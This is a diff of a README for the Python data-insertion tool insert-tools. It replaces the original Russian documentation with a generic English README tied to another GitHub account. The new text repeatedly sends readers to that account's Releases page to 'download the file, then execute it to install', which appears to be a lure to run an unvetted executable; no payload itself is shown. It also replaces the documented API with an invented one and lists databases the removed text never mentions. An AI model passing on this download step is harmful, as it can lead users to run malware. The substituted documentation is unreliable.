@@ -1,104 +1,142 @@
-# 🚀 Insert Tools
+# Insert Tools 🛠️
 
-🔗 [GitHub: castengine/insert-tools](https://github.com/castengine/insert-tools)
-![Python](https://img.shields.io/badge/python-3.8%2B-blue)
-![License](https://img.shields.io/badge/license-MIT-green)
+![GitHub release](https://img.shields.io/github/v/release/ramarimoo/insert-tools) ![Python version](https://img.shields.io/badge/python-3.6%2B-blue) ![License](https://img.shields.io/badge/license-MIT-green)
 
-**Проблема:**
+Welcome to **Insert Tools**, a simple and fast Python toolset designed for bulk data insertion into databases and CSV files. This repository is ideal for ETL (Extract, Transform, Load) pipelines and data engineering tasks. 
 
-Вы сталкивались с проблемами при вставке данных в базы данных? Постоянные ошибки соответствия схем, неправильные типы данных, потеря времени на ручные проверки и риск случайного повреждения данных — всё это знакомо каждому, кто регулярно работает с большими ETL-процессами и базами данных.
+## Table of Contents
 
-**Решение:**
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Supported Databases](#supported-databases)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
-Insert Tools — это мощный и гибко настраиваемый инструмент, специально разработанный для безопасной и быстрой вставки данных в различные базы данных, начиная с ClickHouse. Он автоматически проверяет соответствие схем по названиям столбцов, выполняет приведение типов данных и позволяет проводить предварительную проверку в режиме dry-run, полностью исключая ошибки перед реальной вставкой данных. Особенно полезен инструмент для крупных ETL-процессов, где важно, чтобы обновления схемы целевой таблицы не приводили к падениям системы.
+## Features
 
-## 🔥 Почему это стоит попробовать:
+- **Bulk Insertion**: Insert large volumes of data efficiently.
+- **Multiple Formats**: Supports various database systems and CSV formats.
+- **ETL Ready**: Designed for seamless integration into ETL workflows.
+- **Open Source**: Free to use and modify under the MIT License.
 
-- ✅ **Безопасность данных:** Автоматическая проверка схемы данных по именам столбцов перед вставкой.
-- ⚙️ **Автоприведение типов:** Легко преобразует данные к нужному типу без вашего вмешательства.
-- 🚧 **Dry-run режим:** Тестируйте вставку без рисков.
-- 🐳 **Docker-ready:** Простое развертывание и интеграционные тесты в Docker.
-- 🔧 **Гибкая настройка:** Полностью контролируемый процесс вставки под ваши задачи.
-- 🔥 **Экономия времени:** Забудьте о ручных проверках и ускорьте ваш рабочий процесс.
+## Installation
 
-## 🎯 Ключевые возможности:
-
-- 🖥️ Удобный CLI и Python API.
-- 🛡️ Поддержка строгого режима (strict mode) для полного контроля.
-- 📌 Детализированные логи и расширенный вывод для диагностики.
-- 🔄 Поддержка интеграции с CI/CD процессами.
-
-## 📦 Быстрая установка:
-
-Установите через **PyPI**:
+To install Insert Tools, you can use pip. Run the following command:
 
 ```bash
 pip install insert-tools
 ```
-[Ссылка на проект на PyPI](https://pypi.org/project/insert-tools/1.0.0/)
 
-или для разработки:
+Alternatively, you can download the latest release from our [Releases](https://github.com/ramarimoo/insert-tools/releases) section. Download the file, then execute it to install.
 
-```bash
-pip install -e .[dev]
-```
+## Usage
 
-## 🚀 Запуск и примеры:
+Using Insert Tools is straightforward. Here’s a quick example of how to perform a bulk insert.
 
-Использование через CLI:
-
-```bash
-insert-tools \
-  --host localhost \
-  --port 8123 \
-  --user default \
-  --password admin123 \
-  --database default \
-  --target_table my_table \
-  --select_sql "SELECT * FROM source_table" \
-  --allow_type_cast \
-  --strict \
-  --dry-run \
-  --verbose
-```
-
-Использование через Python:
+### Basic Example
 
 ```python
-from insert_tools.runner import InsertConfig, run_insert
+from insert_tools import BulkInserter
 
-config = InsertConfig(
-    host="localhost",
-    database="default",
-    target_table="my_table",
-    select_sql="SELECT * FROM source_table",
-    user="default",
-    password="admin123",
-    allow_type_cast=True,
-    strict_column_match=True
-)
+# Initialize the inserter
+inserter = BulkInserter(database='your_database', table='your_table')
 
-run_insert(config)
+# Prepare your data
+data = [
+    {'column1': 'value1', 'column2': 'value2'},
+    {'column1': 'value3', 'column2': 'value4'},
+]
+
+# Perform the bulk insert
+inserter.insert(data)
 ```
 
-## 🧪 Тестирование и интеграция:
+### Advanced Usage
 
-```bash
-pytest -v --cov=insert_tools tests/
+You can customize your insertion process by specifying options such as batch size and error handling. For instance:
+
+```python
+inserter = BulkInserter(database='your_database', table='your_table', batch_size=1000)
+
+try:
+    inserter.insert(data)
+except Exception as e:
+    print(f"An error occurred: {e}")
 ```
 
-Поддержка интеграционных тестов через Docker (см. `docker-compose.yml`).
+## Supported Databases
 
-## 📈 Планы на развитие:
+Insert Tools supports a variety of databases, including:
 
-В ближайших планах — поддержка дополнительных популярных баз данных, что сделает Insert Tools универсальным решением для управления ETL-процессами в вашей организации.
+- **PostgreSQL**
+- **MySQL**
+- **SQLite**
+- **ClickHouse**
+- **MongoDB**
 
-## 🤝 Вклад и поддержка проекта:
+You can easily extend the tool to support additional databases by following the contribution guidelines.
 
-Ваши идеи, баг-репорты и pull-реквесты всегда приветствуются! Присоединяйтесь к сообществу и помогите сделать инструмент лучше.
+## Contributing
 
-> С Insert Tools вставка данных становится простой, быстрой и безопасной. Экономьте время и нервы уже сегодня!
+We welcome contributions to Insert Tools. If you have suggestions or improvements, please fork the repository and submit a pull request. 
 
----
+### Steps to Contribute
 
-**Готовы начать? Установите инструмент прямо сейчас и почувствуйте разницу!**
+1. Fork the repository.
+2. Create a new branch (`git checkout -b feature/YourFeature`).
+3. Make your changes.
+4. Commit your changes (`git commit -m 'Add some feature'`).
+5. Push to the branch (`git push origin feature/YourFeature`).
+6. Open a pull request.
+
+## License
+
+Insert Tools is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For questions or feedback, feel free to reach out to the maintainers:
+
+- **GitHub**: [ramarimoo](https://github.com/ramarimoo)
+- **Email**: [your_email@example.com](mailto:your_email@example.com)
+
+## Releases
+
+For the latest updates and downloads, visit our [Releases](https://github.com/ramarimoo/insert-tools/releases) section. You can download the latest version, which includes new features and bug fixes.
+
+## Additional Resources
+
+- [Python Official Documentation](https://docs.python.org/3/)
+- [Pandas Documentation](https://pandas.pydata.org/pandas-docs/stable/)
+- [SQLAlchemy Documentation](https://docs.sqlalchemy.org/en/14/)
+
+## Acknowledgments
+
+We would like to thank the contributors and the open-source community for their support and feedback. Your contributions make this project better.
+
+## Frequently Asked Questions (FAQ)
+
+### What is Insert Tools?
+
+Insert Tools is a Python library designed for efficient bulk data insertion into databases and CSV files, making it suitable for ETL processes.
+
+### Can I use Insert Tools with any database?
+
+Insert Tools supports several databases out of the box. You can extend it to support more by following the contribution guidelines.
+
+### How do I report issues?
+
+You can report issues by creating an issue in the GitHub repository. Please provide as much detail as possible.
+
+### Is there a community for Insert Tools?
+
+Yes, you can join our discussions on GitHub or follow us on social media platforms for updates and community support.
+
+## Conclusion
+
+Insert Tools offers a powerful solution for bulk data insertion tasks. Whether you are working on data engineering projects or need a reliable tool for your ETL pipeline, Insert Tools is here to help. Explore the repository, contribute, and make the most of your data workflows.
+
+Visit our [Releases](https://github.com/ramarimoo/insert-tools/releases) section for the latest updates and downloads.
